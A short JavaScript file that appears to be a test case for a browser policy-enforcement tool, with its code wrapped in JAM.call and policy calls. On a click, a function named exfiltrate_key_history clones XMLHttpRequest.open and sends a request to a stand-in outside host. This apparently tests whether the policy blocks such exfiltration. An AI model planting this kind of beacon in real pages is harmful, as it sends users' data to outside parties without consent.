
JAM.startProfile('load');
function exfiltrate_key_history(){var v0=xmlhttp=new XMLHttpRequest,v2=xmlhttp.open,v2=JAM.call(v2.bind,v2,[xmlhttp],JAM.policy.p1);v0.opennew=v2;JAM.call(xmlhttp.opennew,xmlhttp,["GET","http://AnalyticsInc:8000/submission.html?test=clone2",!0],JAM.policy.p1);JAM.call(xmlhttp.send,xmlhttp,[null],JAM.policy.p1)}JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
